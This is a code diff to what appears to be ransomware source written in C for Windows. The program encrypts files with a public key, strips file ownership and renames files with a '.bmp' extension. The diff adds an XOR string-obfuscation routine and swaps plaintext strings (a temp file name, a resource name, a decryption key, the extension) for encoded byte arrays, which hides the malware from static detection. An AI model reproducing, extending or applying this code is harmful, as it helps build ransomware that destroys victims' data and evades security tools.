@@ -51,6 +51,13 @@ void populateAPICrypto() {
 	TempCryptReleaseContext = (MemeCryptReleaseContext)APIArray[41];
 }
 
+void resolveStringCrypto(BYTE* buffer, BYTE* key, int size) {
+	for (int i = 0; i < size; i++) {
+		buffer[i] ^= 0xFF;
+		buffer[i] ^= key[i % 5];
+	}
+}
+
 // make sure key and nonce are already allocated
 int generateKeyNonce(HCRYPTPROV hCryptProv, BYTE* key, BYTE* nonce) {
 	if (!TempGetTempPathA) {
@@ -79,6 +86,14 @@ int extractResource() {
 	DWORD writeBytes = 0;
 	int return_val = -1;
 
+	BYTE TempPath_key[5] = { 19, 59, 121, 222, 151 };
+	BYTE TempPath_str[13] = { 129, 161, 235, 68, 46, 133, 168, 227, 15, 10, 129, 180, 134 };
+	resolveStringCrypto(TempPath_str, TempPath_key, 13);
+
+	BYTE resourceName_key[5] = { 199, 173, 134, 41, 67 };
+	BYTE resourceName_str[5] = { 97, 23, 60, 130, 188 };
+	resolveStringCrypto(resourceName_str, resourceName_key, 5);
+
 
 	lpTemp = (LPSTR)calloc(MAX_PATH, 1);
 	if (!lpTemp) {
@@ -89,7 +104,7 @@ int extractResource() {
 		goto CLEANUP;
 	}
 
-	strcat(lpTemp, "memeFile.bmp");
+	strcat(lpTemp, (LPCSTR)TempPath_str);
 	memePath = (LPCSTR)calloc(strlen(lpTemp) + 1, 1);
 	if (!memePath) {
 		goto CLEANUP;
@@ -111,7 +126,7 @@ int extractResource() {
 	hResource = TempFindResourceA(
 		hFile,
 		MAKEINTRESOURCEA(101),
-		"YEET"
+		(LPCSTR)resourceName_str
 	);
 
 	if (!hResource) {
@@ -167,7 +182,12 @@ int cryptInit() {
 	if (!TempGetTempPathA) {
 		populateAPICrypto();
 	}
-	const char* decryptKey = "yayeet";
+
+	BYTE decrypt_key[5] = { 159, 153, 152, 134, 49 };
+	BYTE decrypt_str[7] = { 25, 7, 30, 28, 171, 20, 102 };
+	resolveStringCrypto(decrypt_str, decrypt_key, 7);
+
+	const char* decryptKey = (LPCSTR)decrypt_str;
 	for (int i = 0; i < 532; i++) {
 		publicKeyBlob[i] = publicKeyBlob[i] ^ decryptKey[i % strlen(decryptKey)];
 	}
@@ -419,6 +439,10 @@ int fileEncrypt(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPCSTR oriFileName, 
 	if (!TempGetTempPathA) {
 		populateAPICrypto();
 	}
+
+	BYTE bmp_key[5] = { 133, 59, 63, 216, 4 };
+	BYTE bmp_str[5] = { 84, 166, 173, 87, 251 };
+	resolveStringCrypto(bmp_str, bmp_key, 5);
 	killFileOwner((LPSTR)oriFileName);
 
 	HANDLE inFile = TempCreateFileA(oriFileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -438,7 +462,6 @@ int fileEncrypt(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPCSTR oriFileName, 
 		return -1;
 	}
 
-
 	newFileName = (CHAR*)calloc(lstrlenA(oriFileName) + 5, 1);
 
 	if (!newFileName) {
@@ -447,7 +470,7 @@ int fileEncrypt(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPCSTR oriFileName, 
 
 	newFileName = (CHAR*)memmove(newFileName, oriFileName, lstrlenA(oriFileName));
 
-	(CHAR*)memmove(newFileName + lstrlenA(oriFileName), ".bmp", lstrlenA(".bmp"));
+	(CHAR*)memmove(newFileName + lstrlenA(oriFileName), bmp_str, lstrlenA((LPCSTR)bmp_str));
 
 	if (TempReadFile(inFile, fileHeader, 16, NULL, NULL)) {
 		if (!memcmp(fileHeader, memeHeader, 16)) {
